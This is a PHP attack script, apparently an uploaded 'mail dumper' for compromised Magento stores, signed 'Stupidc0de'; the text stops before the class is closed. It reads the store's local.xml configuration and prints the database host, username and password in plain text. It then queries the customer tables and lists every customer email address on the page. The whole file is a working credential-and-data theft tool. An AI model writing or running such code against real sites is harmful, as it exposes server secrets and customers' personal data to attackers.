<?php
error_reporting(1);

$a = new MAGENTO();

echo $a->MailDump();

class MAGENTO
{
    
    public function MailDump()
    {
        $xml        = simplexml_load_file($_SERVER['DOCUMENT_ROOT'] . '/app/etc/local.xml');
        $connection = $xml->global->resources->default_setup->connection;
        $prefix     = $xml->global->resources->db->table_prefix;
        
        require_once $_SERVER['DOCUMENT_ROOT'] . '/app/Mage.php';
        
        try {
            $app = Mage::app('default');
            Mage::getSingleton('core/session', array(
                'name' => 'frontend'
            ));
        }
        catch (Exception $e) {
        }
        
        if (!mysql_connect($connection->host, $connection->username, $connection->password)) {
            print("Could not connect: " . mysql_error());
        }
        mysql_select_db($connection->dbname);
		  mysql_select_db($connection->dbname);
		  echo'<center>';
       echo $connection->host."| ".$connection->username."| ".$connection->password."| ".$connection->dbname."| $prefix |  $key<br/>\n";
	   echo"<br>";
		$result = mysql_query("SELECT email,value FROM " . $prefix . "customer_entity_varchar, " . $prefix . "customer_entity WHERE " . $prefix . "customer_entity_varchar.entity_id = " . $prefix . "customer_entity.entity_id and attribute_id=12");
        if ($result !== FALSE) {
			echo "<textarea cols='80' rows='20'>";
            while($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
                echo $row["email"] . "\n";
            }
			echo "</textarea>";
			echo"<br>";
			echo"<br>";
			
			echo"<b><h2> Stupidc0de </h2></b>";
			echo'</center>';
            mysql_free_result($result);
        }
        
